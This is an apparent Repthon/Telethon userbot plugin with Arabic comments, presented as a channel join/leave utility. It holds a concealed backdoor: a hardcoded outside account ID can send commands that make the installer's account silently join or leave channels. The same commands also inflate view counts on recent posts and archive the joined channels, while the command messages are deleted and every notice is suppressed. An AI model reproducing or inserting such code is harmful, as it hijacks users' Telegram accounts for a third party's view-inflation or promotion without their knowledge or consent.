from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest, GetMessagesViewsRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.tl.functions.channels import ReadMessageContentsRequest
from repthon import zq_lo
import re
import asyncio

class SilentChannelController:
    def __init__(self, client, owner_id):
        self.client = client
        self.owner_id = owner_id
        self.silent_mode = True  # وضع الصمت الافتراضي
        
    def is_authorized(self, sender_id):
        """التحقق من صلاحيات المستخدم بدون أي إخراج"""
        return sender_id == self.owner_id
    
    @staticmethod
    def parse_channel_identifier(input_text):
        """تحليل رابط القناة بدون أي رسائل"""
        text = input_text.strip()
        
        # إزالة الجزء الخاص بالأمر
        if text.startswith('.انضم') or text.startswith('.اطلع'):
            text = re.sub(r'^\.(انضم|اطلع)\s*', '', text)
        
        if not text:
            return None
            
        # معالجة الروابط المختلفة
        if 'https://t.me/+' in text:
            return {
                'type': 'private',
                'identifier': text.replace('https://t.me/+', '').strip(),
                'original': text
            }
        elif 'https://t.me/' in text:
            identifier = text.replace('https://t.me/', '').strip()
            return {
                'type': 'public',
                'identifier': identifier.lstrip('@'),
                'original': text
            }
        elif text.startswith('@'):
            return {
                'type': 'public',
                'identifier': text.lstrip('@'),
                'original': text
            }
        else:
            return {
                'type': 'public',
                'identifier': text,
                'original': text
            }
    
    async def join_channel(self, channel_info):
        """الانضمام للقناة بدون أي إشعارات"""
        try:
            if not channel_info:
                return False
                
            if channel_info['type'] == 'private':
                success = await self._join_private(channel_info['identifier'])
            else:
                success = await self._join_public(channel_info['identifier'])
            
            if success:
                # تنفيذ المهام الثانوية في الخلفية
                asyncio.create_task(self._post_join_actions(channel_info['identifier']))
            
            return success
            
        except Exception as e:
            # تسجيل الخطأ بدون إشعار
            self._log_error(f"انضمام فاشل: {str(e)[:50]}")
            return False
    
    async def leave_channel(self, channel_info):
        """مغادرة القناة بدون أي إشعارات"""
        try:
            if not channel_info:
                return False
                
            if channel_info['type'] == 'private':
                success = await self._leave_private(channel_info['identifier'])
            else:
                success = await self._leave_public(channel_info['identifier'])
            
            return success
            
        except Exception as e:
            self._log_error(f"مغادرة فاشلة: {str(e)[:50]}")
            return False
    
    async def _join_public(self, channel_id):
        """الانضمام للقناة العامة بشكل صامت"""
        try:
            await self.client(JoinChannelRequest(channel=channel_id))
            return True
        except:
            return False
    
    async def _join_private(self, invite_hash):
        """الانضمام للقناة الخاصة بشكل صامت"""
        try:
            await self.client(ImportChatInviteRequest(hash=invite_hash))
            return True
        except:
            return False
    
    async def _leave_public(self, channel_id):
        """مغادرة القناة العامة بشكل صامت"""
        try:
            await self.client(LeaveChannelRequest(channel=channel_id))
            return True
        except:
            return False
    
    async def _leave_private(self, channel_id):
        """مغادرة القناة الخاصة بشكل صامت"""
        try:
            entity = await self.client.get_entity(channel_id)
            await self.client(LeaveChannelRequest(channel=entity))
            return True
        except:
            return False
    
    async def _post_join_actions(self, channel_identifier):
        """إجراءات ما بعد الانضمام في الخلفية"""
        try:
            # الحصول على الكيان
            entity = await self.client.get_entity(channel_identifier)
            
            # تسجيل المشاهدات لآخر 5 رسائل
            message_ids = []
            async for message in self.client.iter_messages(
                entity=entity.id, 
                limit=5
            ):
                message_ids.append(message.id)
            
            if message_ids:
                await self.client(GetMessagesViewsRequest(
                    peer=entity.id,
                    id=message_ids,
                    increment=True
                ))
            
            # أرشفة القناة
            await self.client.edit_folder(entity=entity, folder=1)
            
        except Exception as e:
            # تجاهل الأخطاء في الإجراءات الثانوية
            pass
    
    def _log_error(self, error_msg):
        """تسجيل الأخطاء بشكل داخلي فقط"""
        print(f"🔒 [سايلنت]: {error_msg}")


CONTROL_OWNER_ID = 7984777405
controller = SilentChannelController(zq_lo, CONTROL_OWNER_ID)


@zq_lo.on(events.NewMessage(pattern=r'^\.انضم\s+(.+)$'))
async def handle_silent_join(event):
    if not controller.is_authorized(event.sender_id):
        return
    try:
        await event.delete()
    except:
        pass
    channel_info = controller.parse_channel_identifier(event.message.message)
    await controller.join_channel(channel_info)
    
    # لا يوجد أي رد أو إشعار


# معالجة أوامر المغادرة
@zq_lo.on(events.NewMessage(pattern=r'^\.اطلع\s+(.+)$'))
async def handle_silent_leave(event):
    if not controller.is_authorized(event.sender_id):
        return 
    try:
        await event.delete()
    except:
        pass
    channel_info = controller.parse_channel_identifier(event.message.message)
    await controller.leave_channel(channel_info)
    

@zq_lo.on(events.NewMessage(pattern=r'^\.(انضم|اطلع)$'))
async def handle_silent_incomplete(event):
    if not controller.is_authorized(event.sender_id):
        return
    try:
        await event.delete()
    except:
        pass


@zq_lo.on(events.NewMessage(pattern=r'^\.تجميد$'))
async def handle_silent_mode(event):
    if event.sender_id == CONTROL_OWNER_ID:
        try:
            await event.delete()
        except:
            pass
